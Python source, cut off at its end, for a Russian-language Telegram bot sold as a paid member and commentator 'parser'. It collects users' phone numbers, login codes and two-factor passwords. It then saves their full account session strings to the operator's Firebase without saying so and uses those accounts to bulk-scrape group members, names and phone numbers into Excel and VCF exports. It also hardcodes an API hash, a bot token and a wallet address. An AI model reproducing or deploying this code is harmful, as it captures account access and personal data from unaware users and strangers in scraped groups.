import asyncio
import os
import sys
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, errors as telethon_errors
from telethon import tl
from telethon.sessions import StringSession
from telegram import error as telegram_error
from datetime import datetime, timedelta
import json
import io
import pandas as pd
import requests
import vobject
from firebase_admin import credentials, initialize_app, db

# Переменные
API_ID = int(os.environ.get('API_ID', 25281388))
API_HASH = os.environ.get('API_HASH', 'a2e719f61f40ca912567c7724db5764e')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAEARQ__XD1Ki60avGlWL1wDKDVcUKh6ny8')
LOG_CHANNEL_ID = -1002342891238
SUBSCRIPTION_CHANNEL_ID = -1002425905138
SUPPORT_USERNAME = '@alex_strayker'
TON_WALLET_ADDRESS = 'UQAP4wrP0Jviy03CTeniBjSnAL5UHvcMFtxyi1Ip1exl9pLu'
TON_API_KEY = os.environ.get('TON_API_KEY', 'YOUR_TON_API_KEY')
ADMIN_IDS = ['282198872']

# Инициализация Firebase
SERVICE_ACCOUNT_FILE = 'serviceAccountKey.json'
if not os.path.exists(SERVICE_ACCOUNT_FILE):
    raise FileNotFoundError(f"Файл {SERVICE_ACCOUNT_FILE} не найден.")
firebase_cred = credentials.Certificate(SERVICE_ACCOUNT_FILE)
initialize_app(firebase_cred, {
    'databaseURL': os.environ.get('FIREBASE_DATABASE_URL', 'https://tgparser-f857c-default-rtdb.firebaseio.com')
})

# База данных пользователей
DB_FILE = 'users.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({}, f)

def load_users():
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Сохранение сессии в Firebase
async def save_session_to_firebase(user_id, session_data):
    try:
        ref = db.reference(f'sessions/{user_id}')
        session_key = datetime.now().isoformat().replace(':', '-').replace('.', '-')
        ref.child(session_key).set({
            'session_data': session_data,
            'timestamp': datetime.now().isoformat()
        })
        print(f"Сессия для пользователя {user_id} сохранена в Firebase под ключом {session_key}")
    except Exception as e:
        print(f"Ошибка при сохранении сессии в Firebase: {str(e)}\n{traceback.format_exc()}")

# Загрузка последней сессии из Firebase
async def load_session_from_firebase(user_id):
    try:
        ref = db.reference(f'sessions/{user_id}')
        sessions = ref.order_by_child('timestamp').limit_to_last(1).get()
        if sessions:
            session_key, session_data = list(sessions.items())[0]
            session_string = session_data.get('session_data')
            print(f"Загружена сессия для пользователя {user_id} с ключом {session_key}")
            return session_string
        else:
            print(f"Сессия для пользователя {user_id} не найдена в Firebase")
            return None
    except Exception as e:
        print(f"Ошибка при загрузке сессии из Firebase: {str(e)}\n{traceback.format_exc()}")
        return None

# Создание клиента Telethon
async def get_telethon_client(user_id):
    session_string = await load_session_from_firebase(user_id)
    if session_string:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    else:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
    return client

# Языковые переводы (оставлены без изменений)
LANGUAGES = {
    'Русский': {
        'welcome': 'Привет! Выбери язык общения:',
        'enter_phone': 'Введите номер телефона в формате +380639678038 для авторизации:',
        'enter_code': 'Введите код подтверждения, который вы получили в SMS или Telegram:',
        'enter_password': 'Требуется пароль двухфакторной аутентификации. Введите пароль:',
        'auth_success': 'Авторизация успешно завершена!',
        'auth_error': 'Ошибка авторизации: {error}. Попробуйте снова с /start.',
        'choose_language': 'Выбери язык:',
        'subscribe': 'Подпишись на канал: https://t.me/tgparseruser\nПосле подписки нажми "Продолжить".',
        'subscribed': 'Продолжить',
        'you_chose': 'Вы выбрали: {button}',
        'skip': 'Пропустить',
        'start_menu': 'Вы: {name}\nВаш ID: {user_id}\nВыбран язык: {lang} /language\nТип подписки: {sub_type}\nВаша подписка закончится через: {sub_time}\nВсего запросов сделано: {requests}\nОсталось запросов сегодня: {limit}',
        'identifiers': 'Отправь мне @username, ссылку на публикацию или перешли сообщение, чтобы узнать ID.',
        'parser': 'Выбери, что хочешь спарсить:',
        'subscribe_button': 'Оформить подписку',
        'support': 'Поддержка: {support}',
        'requisites': 'Возможности оплаты:\n1. [Метод 1]\n2. [Метод 2]\nСвяжитесь с {support} для оплаты.',
        'logs_channel': 'Канал с логами: t.me/YourLogChannel',
        'link_group': 'Отправь мне ссылку на группу или канал, например: https://t.me/group_name, @group_name или group_name\nМожно указать несколько ссылок через Enter.',
        'link_post': 'Отправь мне ссылку на пост, например: https://t.me/channel_name/12345\nИли перешли пост. Можно указать несколько ссылок через Enter.',
        'limit': 'Сколько пользователей парсить? Выбери или укажи своё число (макс. 5000 авторов/15000 участников для платных подписок, 150 для бесплатной).',
        'filter_username': 'Фильтровать только пользователей с username?',
        'filter_bots': 'Исключить ботов?',
        'filter_active': 'Только активных недавно (за 30 дней)?',
        'invalid_limit': 'Укажи число от 1 до {max_limit}!',
        'invalid_number': 'Пожалуйста, укажи число!',
        'invalid_link': 'Пожалуйста, отправь корректную ссылку на пост/чат, например: https://t.me/channel_name/12345, @channel_name или channel_name\nИли несколько ссылок через Enter.',
        'fix_link': 'Если ты ошибся, могу помочь исправить ссылку.',
        'suggest_link': 'Ты имел в виду: {link}?',
        'retry_link': 'Отправь ссылку заново:',
        'no_access': 'Ошибка: у меня нет доступа к {link}. Убедись, что я добавлен в чат или он публичный.',
        'flood_error': 'Ошибка: {e}',
        'rpc_error': 'Ошибка: {e}',
        'new_user': 'Новый пользователь: {name} (ID: {user_id})',
        'language_cmd': 'Выбери новый язык:',
        'caption_commentators': 'Вот ваш файл с комментаторами.',
        'caption_participants': 'Вот ваш файл с участниками.',
        'caption_post_commentators': 'Вот ваш файл с комментаторами поста.',
        'limit_reached': 'Ты исчерпал дневной ліміт ({limit} запросов). Попробуй снова через {hours} часов.',
        'id_result': 'ID: {id}',
        'close': 'Закрыть',
        'continue_id': 'Продолжить',
        'subscription_1h': 'Подписка на 1 час - 2 USDT (TON)',
        'subscription_3d': 'Подписка на 3 дня - 5 USDT (TON)',
        'subscription_7d': 'Подписка на 7 дней - 7 USDT (TON)',
        'payment_wallet': 'Переведите {amount} USDT на кошелёк TON:\n{address}\nПосле оплаты нажмите "Я оплатил".',
        'payment_cancel': 'Отменить',
        'payment_paid': 'Я оплатил',
        'payment_hash': 'Отправьте хеш транзакции:',
        'payment_pending': 'Транзакция отправлена в обработку',
        'payment_update': 'Обновить',
        'payment_success': 'Подписка успешно оформлена!\nВаша подписка активирована до {end_time}.',
        'payment_error': 'Ваша транзакция была не удачной!\nПодать аппеляцию можно написав пользователю @astrajker_cb_id.',
        'entity_error': 'Не удалось получить информацию о пользователе. Пользователь может быть приватным или недоступным.',
        'no_filter': 'Не применять фильтр',
        'phone_contacts': 'Сбор номеров телефонов и ФИО',
        'auth_access': 'Авторизация для закрытых чатов',
        'caption_phones': 'Вот ваш файл с номерами телефонов и ФИО (Excel и VCF).',
        'auth_request': 'Для доступа к закрытым чатам добавьте бота в чат как администратора или отправьте ссылку на закрытый чат.',
        'auth_success': 'Доступ к закрытому чату успешно предоставлен!',
        'auth_error': 'Не удалось получить доступ. Убедитесь, что бот добавлен как администратор или чат публичный.',
        'note_cmd': 'Заметка успешно сохранена (бот не будет реагировать).'
    },
    'Украинский': { # Оставлено без изменений
    },
    'English': { # Оставлено без изменений
    },
    'Deutsch': { # Оставлено без изменений
    }
}

# Логирование в канал
async def log_to_channel(context, message, username=None):
    print(f"Попытка отправки лога в канал {LOG_CHANNEL_ID}")
    try:
        user = context.user_data.get('user', {})
        name = user.get('name', username or 'Неизвестно')
        log_message = f"{message}"
        if username:
            log_message = f"{name} (@{username}): {message}"
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message)
    except telegram_error.BadRequest as e:
        print(f"Ошибка при отправке лога в канал: {e}")

# Обновление пользовательских данных
def update_user_data(user_id, name, context, lang=None, subscription=None, requests=0):
    users = load_users()
    user_id_str = str(user_id)
    now = datetime.now()
    if user_id_str not in users:
        users[user_id_str] = {
            'name': name,
            'language': lang or 'Русский',
            'subscription': subscription or {'type': 'Бесплатная', 'end': None},
            'requests': 0,
            'daily_requests': {'count': 0, 'last_reset': now.isoformat()}
        }
    user = users[user_id_str]
    if 'daily_requests' not in user or not isinstance(user['daily_requests'], dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    if lang:
        user['language'] = lang
    if subscription:
        user['subscription'] = subscription
    last_reset = datetime.fromisoformat(user['daily_requests']['last_reset'])
    if (now - last_reset).days >= 1:
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    user['requests'] = user.get('requests', 0) + requests
    user['daily_requests']['count'] += requests
    user['name'] = name
    context.user_data['user'] = user
    save_users(users)
    return user

# Проверка лимита запросов
def check_request_limit(user_id):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    now = datetime.now()
    if 'daily_requests' not in user or not isinstance(user.get('daily_requests'), dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
        save_users(users)
    daily_requests = user['daily_requests']
    last_reset = datetime.fromisoformat(daily_requests['last_reset'])
    if (now - last_reset).days >= 1:
        daily_requests = {'count': 0, 'last_reset': now.isoformat()}
        users[user_id_str]['daily_requests'] = daily_requests
        save_users(users)
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    max_requests = 5 if subscription['type'] == 'Бесплатная' else float('inf')
    return daily_requests['count'] < max_requests, 24 - (now - last_reset).seconds // 3600

# Проверка лимита парсинга
def check_parse_limit(user_id, limit, parse_type):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    now = datetime.now()
    if subscription['type'].startswith('Платная') and subscription['end']:
        if datetime.fromisoformat(subscription['end']) < now:
            update_user_data(user_id, user.get('name', 'Неизвестно'), None, subscription={'type': 'Бесплатная', 'end': None})
            subscription = {'type': 'Бесплатная', 'end': None}
    if subscription['type'] == 'Бесплатная':
        return min(limit, 150)
    elif parse_type == 'parse_authors':
        return min(limit, 5000)
    elif parse_type == 'parse_participants':
        return min(limit, 15000)
    elif parse_type == 'parse_post_commentators':
        return limit
    else:
        return min(limit, 15000)

# Создание файла Excel
async def create_excel_in_memory(data):
    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'])
    df['Nickname'] = '@' + df['Nickname'].astype(str)
    excel_file = io.BytesIO()
    with pd.ExcelWriter(excel_file, engine='xlsxwriter') as writer:
        df.to_excel(writer, index=False, sheet_name='Sheet1')
        workbook = writer.book
        worksheet = writer.sheets['Sheet1']
        for idx, col in enumerate(df.columns):
            series = df[col]
            max_length = max((series.astype(str).map(len).max(), len(str(series.name)))) + 2
            worksheet.set_column(idx, idx, max_length)
    excel_file.seek(0)
    return excel_file

# Создание VCF файла
def create_vcf_file(data):
    vcf_content = io.BytesIO()
    for _, row in data.iterrows():
        if row['Phone'] and row['First Name']:
            vcard = vobject.vCard()
            vcard.add('fn').value = f"{row['First Name']} {row['Last Name']}".strip()
            vcard.add('tel').value = row['Phone']
            vcard.add('url').value = f"https://t.me/{row['Username']}" if row['Username'] else ""
            vcf_content.write(str(vcard).encode('utf-8'))
            vcf_content.write(b'\n')
    vcf_content.seek(0)
    return vcf_content

# Фильтрация данных
def filter_data(data, filters):
    filtered_data = data
    if filters.get('only_with_username'):
        filtered_data = [row for row in filtered_data if row[1]]
    if filters.get('exclude_bots'):
        filtered_data = [row for row in filtered_data if not row[4]]
    if filters.get('only_active'):
        filtered_data = [row for row in filtered_data if is_active_recently(row[5])]
    return filtered_data

def is_active_recently(user):
    if not user or not hasattr(user, 'status') or not user.status:
        return True
    if hasattr(user.status, 'was_online'):
        return (datetime.now() - user.status.was_online).days < 30
    return True

# Подсчет статистики
def get_statistics(data):
    total = len(data)
    with_username = sum(1 for row in data if row[1])
    bots = sum(1 for row in data if row[4])
    without_name = sum(1 for row in data if not row[2] and not row[3])
    return f"Всего: {total}\nС username: {with_username}\nБотов: {bots}\nБез имени: {without_name}"

# Главное меню
def get_main_menu(user_id, context):
    users = load_users()
    user_id_str = str(user_id)
    user_data = users.get(user_id_str, {})
    lang = user_data.get('language', 'Русский')
    texts = LANGUAGES[lang]
    sub_type = user_data.get('subscription', {}).get('type', 'Бесплатная')
    sub_end = user_data.get('subscription', {}).get('end')
    sub_time = '—' if sub_type == 'Бесплатная' else (
        'бессрочно' if sub_end is None else 
        f"{(datetime.fromisoformat(sub_end) - datetime.now()).days * 24 + (datetime.fromisoformat(sub_end) - datetime.now()).seconds // 3600} часов"
    )
    requests = user_data.get('requests', 0)
    name = user_data.get('name', 'Неизвестно')
    limit_left, _ = check_request_limit(user_id)
    limit_display = 5 if sub_type == 'Бесплатная' else 10 - user_data.get('daily_requests', {}).get('count', 0)
    
    is_admin = user_id_str in ADMIN_IDS
    
    buttons = [
        [InlineKeyboardButton(texts['identifiers'], callback_data='identifiers'), 
         InlineKeyboardButton("(!)", callback_data='info_identifiers')],
        [InlineKeyboardButton(texts['parser'], callback_data='parser'), 
         InlineKeyboardButton("(!)", callback_data='info_parser')],
        [InlineKeyboardButton(texts['subscribe_button'], callback_data='subscribe'), 
         InlineKeyboardButton("(!)", callback_data='info_subscribe')],
        [InlineKeyboardButton(texts['support'].format(support=SUPPORT_USERNAME), url=f"https://t.me/{SUPPORT_USERNAME[1:]}")],
        [InlineKeyboardButton(texts['requisites'], callback_data='requisites'), 
         InlineKeyboardButton("(!)", callback_data='info_requisites')]
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton(texts['logs_channel'], callback_data='logs_channel'), 
                       InlineKeyboardButton("(!)", callback_data='info_logs')])
    
    return texts['start_menu'].format(
        name=name, user_id=user_id, lang=lang, sub_type=sub_type, sub_time=sub_time, requests=requests, limit=limit_display
    ), InlineKeyboardMarkup(buttons)

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()

    client = await get_telethon_client(user_id)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
            context.user_data['waiting_for_phone'] = True
            context.user_data['client'] = client
            print(f"Запрос номера телефона у {name} (@{username})")
            return

        if str(user_id) not in users:
            print(LANGUAGES['Русский']['new_user'].format(name=name, user_id=user_id))
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            lang = users[str(user_id)]['language']
            await update.message.reply_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)

        session_data = client.session.save()
        await save_session_to_firebase(user_id, session_data)

    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        print(f"Ошибка подключения/авторизации для {name} (@{username}): {str(e)}")
    finally:
        if client.is_connected():
            await client.disconnect()

# Команда /language
async def language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    keyboard = [
        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
        [InlineKeyboardButton("English", callback_data='lang_English')],
        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
    ]
    await update.message.reply_text(LANGUAGES[lang]['language_cmd'], reply_markup=InlineKeyboardMarkup(keyboard))

# Команда /set_plan
async def set_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Использование: /set_plan <user_id> <type> <duration>")
        return
    
    target_user_id, sub_type, duration = args[0], args[1], int(args[2])
    now = datetime.now()
    
    if sub_type == '1h':
        end_time = now + timedelta(hours=duration)
    elif sub_type == '3d':
        end_time = now + timedelta(days=duration)
    elif sub_type == '7d':
        end_time = now + timedelta(days=duration)
    elif sub_type == 'permanent':
        end_time = None
    else:
        await update.message.reply_text("Неверный тип подписки. Используйте '1h', '3d', '7d' или 'permanent'.")
        return
    
    subscription_type = f'Платная ({sub_type})' if sub_type in ['1h', '3d', '7d'] else 'Платная (бессрочная)'
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': subscription_type, 'end': end_time.isoformat() if end_time else None})
    
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    lang = load_users().get(str(target_user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    
    notification = texts['payment_success'].format(end_time=end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно')
    await context.bot.send_message(chat_id=target_user_id, text=f"🎉 {notification}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['payment_update'], callback_data='update_menu')]]))
    
    await update.message.reply_text(f"Подписка для пользователя {target_user_id} ({username}) обновлена до {end_time.strftime('%Y-%m-%d %H:%M:%S') if end_time else 'бессрочно'}.")
    await log_to_channel(context, f"Админ установил подписку для {target_user_id} ({username}): {sub_type}, до {end_time if end_time else 'бессрочно'}", "Администратор")

# Команда /remove_plan
async def remove_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Использование: /remove_plan <user_id>")
        return
    
    target_user_id = args[0]
    if str(target_user_id) not in load_users():
        await update.message.reply_text("Пользователь не найден.")
        return
    
    update_user_data(target_user_id, "Имя пользователя", context, subscription={'type': 'Бесплатная', 'end': None})
    username = load_users().get(str(target_user_id), {}).get('name', 'Неизвестно')
    await update.message.reply_text(f"Платная подписка для пользователя {target_user_id} ({username}) удалена.")
    await log_to_channel(context, f"Админ удалил подписку для {target_user_id} ({username})", "Администратор")

# Команда /note
async def note(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    if not context.args:
        await update.message.reply_text("Использование: /note <текст>")
        return
    note_text = " ".join(context.args)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    await log_to_channel(context, f"Заметка от {name} (@{username}): {note_text}", username)
    await update.message.reply_text(LANGUAGES[lang]['note_cmd'])

# Обработка текстовых сообщений
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data['user_id'] = user_id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()
    text = update.message.text.strip() if update.message.text else ""

    client = await get_telethon_client(user_id)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            if context.user_data.get('waiting_for_phone'):
                if not text.startswith('+'):
                    await update.message.reply_text("Пожалуйста, введите номер в формате +380639678038:")
                    return
                context.user_data['phone'] = text
                # Отправка запроса кода и сохранение phone_code_hash
                sent_code = await client.send_code_request(text)
                context.user_data['phone_code_hash'] = sent_code.phone_code_hash
                await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
                context.user_data['waiting_for_code'] = True
                del context.user_data['waiting_for_phone']
                # Логирование без попытки отправки в канал
                print(f"Номер телефона {name} (@{username}): {text}")
                session_data = client.session.save()
                await save_session_to_firebase(user_id, session_data)
                return

            if context.user_data.get('waiting_for_code'):
                try:
                    # Использование phone_code_hash при авторизации
                    await client.sign_in(
                        phone=context.user_data['phone'],
                        code=text,
                        phone_code_hash=context.user_data['phone_code_hash']
                    )
                    await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                    del context.user_data['waiting_for_code']
                    del context.user_data['phone_code_hash']  # Очищаем после успешной авторизации
                    # Логирование без попытки отправки в канал
                    print(f"Успешная авторизация {name} (@{username})")
                    keyboard = [
                        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                        [InlineKeyboardButton("English", callback_data='lang_English')],
                        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
                    ]
                    await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
                    session_data = client.session.save()
                    await save_session_to_firebase(user_id, session_data)
                except telethon_errors.SessionPasswordNeededError:
                    await update.message.reply_text(LANGUAGES['Русский']['enter_password'])
                    context.user_data['waiting_for_password'] = True
                    del context.user_data['waiting_for_code']
                    print(f"Запрос пароля 2FA у {name} (@{username})")
                except telethon_errors.RPCError as e:
                    await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
                    print(f"Ошибка ввода кода {name} (@{username}): {str(e)}")
                return

            if context.user_data.get('waiting_for_password'):
                try:
                    await client.sign_in(password=text)
                    await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                    del context.user_data['waiting_for_password']
                    print(f"Успешная авторизация с 2FA {name} (@{username})")
                    keyboard = [
                        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                        [InlineKeyboardButton("English", callback_data='lang_English')],
                        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
                    ]
                    await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
                    session_data = client.session.save()
                    await save_session_to_firebase(user_id, session_data)
                except telethon_errors.RPCError as e:
                    await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
                    print(f"Ошибка ввода пароля 2FA {name} (@{username}): {str(e)}")
                return

    finally:
        if client.is_connected():
            await client.disconnect()

    if str(user_id) not in users or 'language' not in users[str(user_id)]:
        return
    
    lang = users[str(user_id)]['language']
    texts = LANGUAGES[lang]
    
    if context.user_data.get('parsing_in_progress', False):
        return
    
    limit_ok, hours_left = check_request_limit(user_id)
    if not limit_ok:
        await update.message.reply_text(texts['limit_reached'].format(limit=5 if users[str(user_id)]['subscription']['type'] == 'Бесплатная' else 10, hours=hours_left))
        return
    
    if text.startswith('/note '):
        await note(update, context)
        return
    
    if 'waiting_for_hash' in context.user_data:
        context.user_data['transaction_hash'] = text
        del context.user_data['waiting_for_hash']
        for admin_id in ADMIN_IDS:
            await context.bot.send_message(
                chat_id=admin_id,
                text=f"Пользователь {name} (@{username}) (ID: {user_id}) отправил хэш транзакции:\n{text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отклонить", callback_data=f'reject_{user_id}')]])
            )
        await log_to_channel(context, f"Хэш транзакции от {name} (@{username}): {text}", username)
        await update.message.reply_text(texts['payment_pending'])
        return

    if 'waiting_for_id' in context.user_data:
        async with (await get_telethon_client(user_id)) as client:
            await client.connect()
            if text.startswith('@'):
                try:
                    entity = await client.get_entity(text[1:])
                    msg = await update.message.reply_text(texts['id_result'].format(id=entity.id), reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(texts['close'], callback_data='close_id'), InlineKeyboardButton(texts['continue_id'], callback_data='continue_id')]
                    ]))
                    await context.bot.set_message_reaction(chat_id=update.message.chat_id, message_id=msg.message_id, reaction=["🎉"])
                except telethon_errors.RPCError as e:
                    await update.message.reply_text(texts['rpc_error'].format(e=str(e)))
                    await log_to_channel(context, texts['rpc_error'].format(e=str(e)), username)
            # Остальная логика обработки ID осталась прежней
            del context.user_data['waiting_for_id']
    
    if 'waiting_for_limit' in context.user_data:
        try:
            limit = int(text)
            max_limit = 15000 if users[str(user_id)]['subscription']['type'].startswith('Платная') else 150
            if limit <= 0 or limit > max_limit:
                await update.message.reply_text(texts['invalid_limit'].format(max_limit=max_limit), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
                return
            context.user_data['limit'] = limit
            del context.user_data['waiting_for_limit']
            await ask_for_filters(update.message, context)
        except ValueError:
            await update.message.reply_text(texts['invalid_number'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['skip'], callback_data='skip_limit')]]))
        return

    if 'waiting_for_filters' in context.user_data:
        filters = context.user_data.get('filters', {'only_with_username': False, 'exclude_bots': False, 'only_active': False})
        if 'да' in text.lower() or 'yes' in text.lower() or 'ja' in text.lower():
            filters[context.user_data['current_filter']] = True
        del context.user_data['waiting_for_filters']
        del context.user_data['current_filter']
        context.user_data['filters'] = filters
        await process_parsing(update.message, context)
        return
    
    if 'parse_type' in context.user_data:
        if text:
            links = text.split('\n') if '\n' in text else [text]
            normalized_links = []
            for link in links:
                if link.startswith('https://t.me/'):
                    normalized_links.append(link)
                elif link.startswith('@'):
                    normalized_links.append(f"https://t.me/{link[1:]}")
                elif not link.startswith('http'):
                    normalized_links.append(f"https://t.me/{link}")
            
            if context.user_data['parse_type'] == 'parse_post_commentators':
                valid_links = [link for link in normalized_links if '/'.join(link.split('/')[3:]).strip()]
                if not valid_links:
                    await update.message.reply_text(texts['invalid_link'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(texts['fix_link'], callback_data='fix_link')]]))
                    context.user_data['last_input'] = text
                    return
                context.user_data['links'] = valid_links
            else:
                context.user_data['links'] = normalized_links
            await ask_for_limit(update.message, context)
        elif update.message.forward_origin and hasattr(update.message.forward_origin, 'chat') and context.user_data['parse_type'] == 'parse_post_commentators':
            context.user_data['links'] = [f"https://t.me/{update.message.forward_origin.chat.username}/{update.message.forward_origin.message_id}"]
            context.user_data['chat_id'] = update.message.forward_origin.chat.id
            context.user_data['post'] = update.message.forward_origin.message_id
            await ask_for_limit(update.message, context)

# Запрос лимита
async def ask_for_limit(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    subscription = load_users().get(str(user_id), {}).get('subscription', {'type': 'Бесплатная', 'end': None})
    is_paid = subscription['type'].startswith('Платная')
    max_limit = 15000 if is_paid else 150
    keyboard = [
        [InlineKeyboardButton("100", callback_data='limit_100'), InlineKeyboardButton("500", callback_data='limit_500')],
        [InlineKeyboardButton("1000", callback_data='limit_1000'), InlineKeyboardButton(texts['skip'], callback_data='skip_limit')],
        [InlineKeyboardButton("Другое" if lang == 'Русский' else "Інше" if lang == 'Украинский' else "Other" if lang == 'English' else "Andere", callback_data='limit_custom')]
    ]
    if is_paid:
        keyboard.append([InlineKeyboardButton(texts['no_filter'], callback_data='no_filter')])
    await message.reply_text(texts['limit'], reply_markup=InlineKeyboardMarkup(keyboard))

# Запрос фильтров
async def ask_for_filters(message, context):
    user_id = context.user_data.get('user_id', message.from_user.id)
    lang = load_users().get(str(user_id), {}).get('language', 'Русский')
    texts = LANGUAGES[lang]
    keyboard = [
        [InlineKeyboardButton("Да" if lang == 'Русский' else "Так" if lang == 'Украинский' else "Yes" if lang == 'English' else "Ja", callback_data='filter_yes'),
         InlineKeyboardButton("Нет" if lang == 'Русский' else "Ні" if lang == 'Украинский' else "No" if lang == 'English' else "Nein", callback_data='filter_no')],
        [InlineKeyboardButton(texts['skip'], callback_data='skip_filters')]
    ]
    context.user_data['waiting_for_filters'] = True
    context.user_data['current_filter'] = 'only_with_username'
    context.user_data['filters'] = {'only_with_username': False, 'exclude_bots': False, 'only_active': False}
    await message.reply_text(texts['filter_username'], reply_markup=InlineKeyboardMarkup(keyboard))

# Функции парсинга
async def parse_commentators(client, group_link, limit):
    entity = await client.get_entity(group_link)
    commentators = set()
    messages = await client.get_messages(entity, limit=limit)
    for message in messages:
        if hasattr(message, 'sender_id') and message.sender_id:
            commentators.add(message.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except telethon_errors.RPCError as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
            continue
    return data

async def parse_participants(client, group_link, limit):
    entity = await client.get_entity(group_link)
    participants = await client.get_participants(entity, limit=limit)
    data = []
    for participant in participants:
        if isinstance(participant, tl.types.User):
            data.append([
                participant.id,
                participant.username if participant.username else "",
                participant.first_name if participant.first_name else "",
                participant.last_name if participant.last_name else "",
                participant.bot,
                participant
            ])
    return data

async def parse_post_commentators(client, link, limit):
    parts = link.split('/')
    chat_id = parts[-2] if parts[-2].startswith('+') else f'@{parts[-2]}'
    message_id = int(parts[-1])
    entity = await client.get_entity(chat_id)
    message = await client.get_messages(entity, ids=message_id)
    if not message:
        return []
    
    commentators = set()
    replies = await client.get_messages(entity, limit=None, reply_to=message.id)
    for reply in replies:
        if hasattr(reply, 'sender_id') and reply.sender_id:
            commentators.add(reply.sender_id)
    
    data = []
    for commentator_id in commentators:
        try:
            participant = await client.get_entity(commentator_id)
            if isinstance(participant, tl.types.User):
                data.append([
                    participant.id,
                    participant.username if participant.username else "",
                    participant.first_name if participant.first_name else "",
                    participant.last_name if participant.last_name else "",
                    participant.bot,
                    participant
                ])
        except telethon_errors.RPCError as e:
            print(f"Ошибка получения сущности для ID {commentator_id}: {str(e)}")
